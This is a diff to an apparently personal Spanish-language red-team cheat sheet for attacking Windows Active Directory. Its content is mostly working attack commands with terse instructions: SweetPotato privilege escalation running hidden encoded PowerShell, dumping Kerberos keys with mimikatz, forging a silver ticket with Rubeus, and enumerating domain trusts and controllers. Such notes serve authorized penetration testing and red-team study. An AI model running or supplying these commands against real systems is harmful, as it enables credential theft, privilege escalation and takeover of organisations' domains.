@@ -621,3 +621,28 @@ Si puede impersonar a cualquier usuario se fuerza la autenticacion de un NT Auth
 ```
 execute-assembly C:\Tools\SweetPotato\bin\Release\SweetPotato.exe -p C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe -a "-w hidden -enc ..."
 ```
+# Domain Dominance
+## Silver Ticket (TGS)
+Coger el SID de los dominios
+```
+powershell (Get-ADForest).Domains| %{Get-ADDomain -Server $_} | Select-Object name, domainsid
+```
+Dumpear llaves de Kerberos
+```
+mimikatz !sekurlsa::ekeys
+```
+En la otra maquina, crea un TGS con los datos
+```
+C:\Tools\Rubeus\Rubeus\bin\Release\Rubeus.exe silver /service:cifs/EQUIPO_LLAVES_KERBEROS.DOMINIO /aes256:LLAVE_KERBEROS /user:USUARIO /domain:DOMINIO /sid:SID_DOMINIO /nowrap
+```
+
+# Forest & Domain Trusts
+## Parent/Child
+Enumerar Dominios
+```
+powershell Get-DomainTrust
+```
+Nombre del DC del dominio
+```
+powershell Get-DomainController -Domain DOMINIO | select Name
+```
